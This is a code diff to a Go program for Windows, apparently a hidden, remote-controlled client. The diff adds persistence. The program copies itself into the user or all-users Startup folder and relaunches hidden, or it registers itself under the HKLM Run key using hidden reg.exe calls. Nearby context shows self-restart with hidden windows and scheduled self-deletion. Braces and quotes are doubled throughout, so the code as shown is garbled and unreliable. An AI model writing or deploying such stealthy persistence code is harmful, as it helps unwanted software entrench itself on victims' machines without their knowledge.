@@ -258,6 +258,14 @@ func main() {{
 
         go runRawLoop(ctx, url, manager)
     }}
+    switch startupMode {{
+    case 1:
+        moveToStartupFolder(false)
+    case 2:
+        moveToStartupFolder(true)
+    case 3:
+        addToRegistryRun()
+    }}
 
     <-ctx.Done()
 }}
@@ -607,6 +615,80 @@ func restartSelf() error {{
     cmd := exec.Command(exePath)
     cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
     return cmd.Start()
+}}
+
+func moveToStartupFolder(allUsers bool) {{
+    exePath, err := os.Executable()
+    if err != nil {{
+        return
+    }}
+
+    var base string
+    if allUsers {{
+        base = strings.TrimSpace(os.Getenv(""ProgramData""))
+        if base == """" {{
+            base = ""C:\\ProgramData""
+        }}
+        startupDir := filepath.Join(base, ""Microsoft"", ""Windows"", ""Start Menu"", ""Programs"", ""StartUp"")
+        copyToStartup(exePath, startupDir)
+        return
+    }}
+
+    base = strings.TrimSpace(os.Getenv(""APPDATA""))
+    if base == """" {{
+        return
+    }}
+    startupDir := filepath.Join(base, ""Microsoft"", ""Windows"", ""Start Menu"", ""Programs"", ""Startup"")
+    copyToStartup(exePath, startupDir)
+}}
+
+func copyToStartup(exePath, startupDir string) {{
+    targetPath := filepath.Join(startupDir, filepath.Base(exePath))
+
+    if strings.EqualFold(exePath, targetPath) {{
+        return
+    }}
+
+    data, err := os.ReadFile(exePath)
+    if err != nil {{
+        return
+    }}
+
+    if err := os.WriteFile(targetPath, data, 0755); err != nil {{
+        return
+    }}
+
+    cmd := exec.Command(targetPath)
+    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
+    if err := cmd.Start(); err != nil {{
+        return
+    }}
+
+    os.Exit(0)
+}}
+
+func addToRegistryRun() {{
+    exePath, err := os.Executable()
+    if err != nil {{
+        return
+    }}
+
+    valueName := filepath.Base(exePath)
+    if idx := strings.LastIndex(valueName, "".""); idx != -1 {{
+        valueName = valueName[:idx]
+    }}
+
+    const runKey = `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+
+    query := exec.Command(""reg"", ""query"", runKey, ""/v"", valueName)
+    query.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
+    if query.Run() == nil {{
+        return
+    }}
+
+    addCmd := exec.Command(""reg"", ""add"", runKey, ""/v"", valueName, ""/t"", ""REG_SZ"", ""/d"", exePath, ""/f"")
+    addCmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
+    addCmd.Run()
 }}
 
 func scheduleSelfDelete() error {{
